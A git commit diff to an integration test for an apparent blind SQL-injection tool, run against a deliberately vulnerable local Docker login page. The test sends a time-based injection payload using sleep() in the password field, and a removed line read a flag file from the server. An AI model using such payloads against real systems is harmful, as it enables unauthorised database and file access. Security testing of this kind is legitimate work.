aab0bbe6d5f35ced3b8ff0f85329cedcf0986a77
neuronaddict <manufrommars@elacourarie.org>
2020-08-15 23:30:02 +0200

    Try to improve speed of time based string finder

--- itests/mysql/test_TimeBasedblindStringFinder.py
+++ itests/mysql/test_TimeBasedblindStringFinder.py
@@ -6,7 +6,7 @@ from pyic import BlindStringFinder, SqliEncoder, TimeBlindTester
 logging.basicConfig(level=logging.DEBUG)
 
 
-class TestBlindStringFinder(TestCase):
+class TestTimeBasedBlindStringFinder(TestCase):
     """
     This test need the docker sqli in https://github.com/NeuronAddict/vulnerable-apps.git running
     """
@@ -14,23 +14,19 @@ class TestBlindStringFinder(TestCase):
     def setUp(self):
         self.tester = TimeBlindTester(
             lambda payload: requests.post('http://127.0.0.1:8181/login.php', data={'login': 'admin',
-                                                                                   'pass': "' OR ( ({}) AND sleep(1) ) #".format(
+                                                                                   'pass': "' OR ( ({}) AND sleep(1.5) ) #".format(
                                                                                        payload)}),
-            0.5, 1
+            1.3, 1.5
         )
 
         self.string_finder = BlindStringFinder(self.tester)
 
-    def test_false_serie(self):
+    def test_all(self):
 
         self.assertFalse(self.tester.test('1=0'))
 
         self.assertTrue(self.tester.test('1=1'))
 
-        self.assertEqual(self.string_finder.str_length("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
-                         6)
-
         self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                          'coucou')
 
-        self.assertEqual(self.string_finder.read_file('/var/www/html/flag.txt'), 'dee8cha8moh9ahyeM4atheemi\n')
